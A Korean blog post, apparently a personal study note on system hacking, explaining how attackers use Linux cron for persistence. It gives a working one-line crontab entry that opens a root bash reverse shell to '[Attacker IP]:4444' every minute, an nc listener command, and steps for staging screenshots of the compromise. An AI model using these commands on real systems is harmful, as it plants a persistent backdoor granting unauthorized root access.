---
layout: post
title: "cron을 이용한 지속성 확보 공부"
date: 2025-09-19 17:00:00 +0900
categories: Study 시스템 해킹
---

### 1. 개요

지속성`Persistence`은 공격자가 시스템 재부팅 · 세션 종료 · 초기 침투에 사용된 취약점이 패치된 후에도 시스템에 대한 접근 권한을 계속 유지하는 기술이다. 권한을 획득한 것만큼이나 그 권한을 잃지 않는 것이 중요하며 리눅스 환경에서는 주기적으로 명령을 실행하는 `cron` 스케줄러가 지속성 확보를 위한 주요 수단으로 사용된다.

---

### 2. cron 기본

`cron`은 특정 시간에 지정된 작업을 자동으로 실행하는 리눅스의 데몬이다. 사용자는 `crontab` 파일을 수정하여 작업을 예약할 수 있다.

*   **주요 경로:**
    *   `/etc/crontab`: 시스템 전체에 적용되는 cron 작업 파일. 사용자 계정을 지정하여 명령을 실행할 수 있다.
    *   `/var/spool/cron/crontabs/`: 사용자별 crontab 파일이 저장되는 디렉터리. `root` 사용자의 crontab은 여기에 위치한다.
*   **형식:**
    ```
    # ┌───────────── 분 (0 - 59)
    # │ ┌───────────── 시 (0 - 23)
    # │ │ ┌───────────── 일 (1 - 31)
    # │ │ │ ┌───────────── 월 (1 - 12)
    # │ │ │ │ ┌───────────── 요일 (0 - 6)
    # │ │ │ │ │
    # * * * * * <사용자> <실행할 명령어>
    ```

---

### 3. 사용 예시: crontab을 이용한 리버스 쉘 연결

이전 게시글에서 `root` 권한을 획득한 공격자가 매 분마다 공격자 PC로 리버스 쉘을 연결하는 cron 작업을 등록하여 시스템에 대한 영구적인 백도어를 생성하는 상황이다.

#### **1. 공격자 리스너 실행**
공격자 PC에서 `netcat`을 이용해 4444번 포트에서 연결을 대기한다.
```bash
nc -lvnp 4444
```

#### **2. 대상 서버에 cron 작업 등록**
획득한 `root` 쉘에서 `root` 사용자의 crontab에 1분마다 리버스 쉘을 실행하는 작업을 추가한다. `crontab -e`를 사용하는 대신 `echo`와 파이프를 이용하여 비대화형(non-interactive) 방식으로 작업을 등록할 수 있다.
```bash
# 기존 crontab 내용을 유지하면서 새 작업을 추가
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/[Attacker IP]/4444 0>&1") | crontab -
```

#### **3. 연결 수신 확인**
cron 작업이 등록되고 1분 이내에 공격자 PC의 `netcat` 리스너는 대상 서버로부터 들어오는 `root` 권한의 쉘 연결을 수신하게 된다.
[여기에 Crontab 설정 및 리버스 쉘 수신 비교 이미지 삽입]

이제 대상 서버가 재부팅되거나 다른 관리자가 악성 프로세스를 종료시키더라도 `cron` 데몬은 매 분마다 공격자에게 다시 쉘을 제공하므로 공격자는 시스템에 대한 통제권을 잃지 않게 된다.

<hr class="short-rule">





### 시각 자료(이미지) 제작을 위한 스크립트

#### **Crontab 설정 및 리버스 쉘 수신 비교 이미지 제작**

이 이미지는 원인(cron 작업 등록)과 결과(쉘 연결 수신)를 명확하게 보여줍니다.

**1. "Before" 이미지 (Crontab 설정)**

1.  (준비) `GTFOBins` 등을 통해 `root` 권한을 획득한 **대상 서버(Target)**의 터미널 창을 준비합니다.
2.  `crontab -l` 명령을 실행하여 현재 등록된 cron 작업이 없는 것을 보여줍니다. (오류가 나거나 아무것도 출력되지 않음)
3.  위 `3. 사용 예시` 섹션의 2번 명령어 `(crontab -l ...)`를 실행하여 리버스 쉘 작업을 등록합니다.
4.  `crontab -l` 명령을 다시 실행하여, `* * * * * /bin/bash ...` 라인이 성공적으로 추가되었음을 보여줍니다.
5.  이 과정이 모두 담긴 **대상 서버**의 터미널 화면을 스크린샷으로 찍어 **`Crontab_설정.png`** 로 저장합니다.

**2. "After" 이미지 (Reverse Shell 수신)**

1.  (준비) **공격자 PC(Attacker)**의 터미널에서 `nc -lvnp 4444` 명령어를 실행하여 리스닝 상태로 둡니다.
2.  **대상 서버**에서 cron 작업이 실행될 때까지 최대 1분간 기다립니다.
3.  시간이 되면 **공격자 PC**의 터미널에 `connect to ...` 메시지와 함께 `root@ubuntu...` 와 같은 `root` 프롬프트가 나타납니다.
4.  `whoami` 명령어를 실행하여 `root`가 출력되는 것을 추가로 보여줍니다.
5.  이 연결 수신 및 명령어 실행 결과가 보이는 **공격자 PC**의 터미널 화면을 스크린샷으로 찍어 **`Reverse_Shell_수신.png`** 로 저장합니다.

**3. 최종 이미지 편집**

1.  이미지 편집 프로그램에서 `Crontab_설정.png`(왼쪽)와 `Reverse_Shell_수신.png`(오른쪽)를 나란히 배치합니다.
2.  각 이미지 위에 "**대상 서버 (Crontab 설정)**"과 "**공격자 PC (Reverse Shell 수신)**" 텍스트를 추가합니다.
3.  왼쪽 이미지에서는 `crontab -l` 결과로 출력된 리버스 쉘 명령어 라인에 하이라이트를 적용합니다.
4.  오른쪽 이미지에서는 새로 획득한 `root` 프롬프트와 `whoami` 결과에 하이라이트를 적용하여, cron 작업을 통해 쉘을 획득했음을 명확히 보여줍니다.
5.  수정된 이미지를 저장하여 게시글에 삽입합니다.